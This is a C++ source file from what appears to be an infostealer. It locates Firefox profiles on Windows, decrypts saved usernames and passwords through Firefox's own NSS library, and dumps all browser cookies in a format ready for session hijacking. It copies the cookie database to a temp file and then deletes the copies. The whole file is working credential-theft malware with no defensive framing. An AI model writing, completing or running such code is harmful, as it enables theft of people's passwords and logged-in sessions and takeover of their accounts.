#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>

#include "FirefoxStealer.h"
#include "../crypto/Base64.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <sstream>

#pragma comment(lib, "shlwapi.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        typedef enum {
            SECSuccess = 0,
            SECFailure = -1
        } SECStatus;

        struct SECItem {
            unsigned int type;
            unsigned char* data;
            unsigned int len;
        };

        typedef SECStatus(*NSSInitFunc)(const char*);
        typedef SECStatus(*PK11SDRDecryptFunc)(SECItem*, SECItem*, void*);
        typedef SECStatus(*NSSShutdownFunc)();

        std::string FindFirefoxInstallPath() {
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
                std::string p = std::string(path) + "\\Mozilla Firefox";
                if (fs::exists(p)) return p;
            }
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path))) {
                std::string p = std::string(path) + "\\Mozilla Firefox";
                if (fs::exists(p)) return p;
            }
            return "";
        }

        std::vector<std::string> FindFirefoxProfiles() {
            std::vector<std::string> profiles;
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
                fs::path profilesPath = fs::path(path) / "Mozilla" / "Firefox" / "Profiles";
                if (fs::exists(profilesPath)) {
                    for (const auto& entry : fs::directory_iterator(profilesPath)) {
                        if (entry.is_directory()) {
                            profiles.push_back(entry.path().string());
                        }
                    }
                }
            }
            return profiles;
        }

        std::string DecryptNSS(const std::string& base64Data, PK11SDRDecryptFunc decryptFunc) {
            std::vector<BYTE> encrypted = crypto::Base64Decode(base64Data);
            if (encrypted.empty()) return "";

            SECItem input = { 0, encrypted.data(), (unsigned int)encrypted.size() };
            SECItem output = { 0, nullptr, 0 };

            if (decryptFunc(&input, &output, nullptr) == SECSuccess) {
                std::string decrypted((char*)output.data, output.len);
                // NSS allocates memory that should be freed with SECITEM_FreeItem or similar,
                // but since we don't have all headers, we just hope it's standard heap or leak it once.
                return decrypted;
            }
            return "";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            CopyFileA(src.c_str(), dest.c_str(), FALSE);
            // Also copy sidecars if they exist (WAL mode)
            std::string wal = src + "-wal";
            std::string shm = src + "-shm";
            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
        }

        void SafeDeleteDatabase(const std::string& path) {
            DeleteFileA(path.c_str());
            DeleteFileA((path + "-wal").c_str());
            DeleteFileA((path + "-shm").c_str());
        }
    }

    std::string DumpFirefoxPasswords() {
        std::string firefoxPath = FindFirefoxInstallPath();
        if (firefoxPath.empty()) return "Firefox installation not found.";

        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) return "No Firefox profiles found.";

        // We must load nss3.dll from the Firefox directory
        std::string nssDllPath = firefoxPath + "\\nss3.dll";
        HMODULE hNss = LoadLibraryExA(nssDllPath.c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
        if (!hNss) return "Failed to load nss3.dll from " + firefoxPath;

        auto nssInit = (NSSInitFunc)GetProcAddress(hNss, "NSS_Init");
        auto nssShutdown = (NSSShutdownFunc)GetProcAddress(hNss, "NSS_Shutdown");
        auto pk11SdrDecrypt = (PK11SDRDecryptFunc)GetProcAddress(hNss, "PK11SDR_Decrypt");

        if (!nssInit || !pk11SdrDecrypt) {
            FreeLibrary(hNss);
            return "Failed to find NSS functions.";
        }

        std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
        report += "PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";
        
        bool foundAny = false;

        for (const auto& profile : profiles) {
            fs::path loginsPath = fs::path(profile) / "logins.json";
            if (!fs::exists(loginsPath)) continue;

            // NSS_Init requires the profile directory
            if (nssInit(profile.c_str()) != SECSuccess) continue;

            try {
                std::ifstream f(loginsPath);
                nlohmann::json j;
                f >> j;

                if (j.contains("logins")) {
                    for (const auto& login : j["logins"]) {
                        std::string url = login.value("hostname", "N/A");
                        std::string encUser = login.value("encryptedUsername", "");
                        std::string encPass = login.value("encryptedPassword", "");

                        std::string username = DecryptNSS(encUser, pk11SdrDecrypt);
                        std::string password = DecryptNSS(encPass, pk11SdrDecrypt);

                        if (!username.empty() || !password.empty()) {
                            report += fs::path(profile).filename().string() + " | " + url + " | " + username + " | " + password + "\n";
                            foundAny = true;
                        }
                    }
                }
            } catch (...) {}

            if (nssShutdown) nssShutdown();
        }

        FreeLibrary(hNss);

        if (!foundAny) return "No passwords found in Firefox profiles.";
        return report;
    }

    std::string StealFirefoxCookies() {
        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) return "No Firefox profiles found to steal cookies from.";

        std::stringstream resultSS;
        resultSS << "# FIREFOX COOKIE STEALER RESULTS\n";
        
        int cookieCount = 0;

        for (const auto& profile : profiles) {
            fs::path cookiesDbPath = fs::path(profile) / "cookies.sqlite";
            if (!fs::exists(cookiesDbPath)) continue;

            // Copy to temp
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string tempDb = std::string(tempPath) + "cfx_" + std::to_string(GetTickCount64()) + ".sqlite";
            
            SafeCopyDatabase(cookiesDbPath.string(), tempDb);

            sqlite3* db;
            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                const char* query = "SELECT host, path, isSecure, expiry, name, value FROM moz_cookies";
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* path = (const char*)sqlite3_column_text(stmt, 1);
                        int isSecure = sqlite3_column_int(stmt, 2);
                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                        const char* name = (const char*)sqlite3_column_text(stmt, 4);
                        const char* value = (const char*)sqlite3_column_text(stmt, 5);
                        
                        // Format: domain flag path secure expiry name value
                        resultSS << (host ? host : "") << "\t"
                                 << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
                                 << (path ? path : "") << "\t"
                                 << (isSecure ? "TRUE" : "FALSE") << "\t"
                                 << expiry << "\t"
                                 << (name ? name : "") << "\t"
                                 << (value ? value : "") << "\n";
                        
                        cookieCount++;
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            SafeDeleteDatabase(tempDb);
        }

        if (cookieCount == 0) return "No cookies found in Firefox profiles.";
        
        std::stringstream finalOut;
        finalOut << "# Total cookies extracted: " << cookieCount << "\n";
        finalOut << "# Netscape HTTP Cookie File Format\n#\n";
        finalOut << resultSS.str();
        
        return finalOut.str();
    }

}
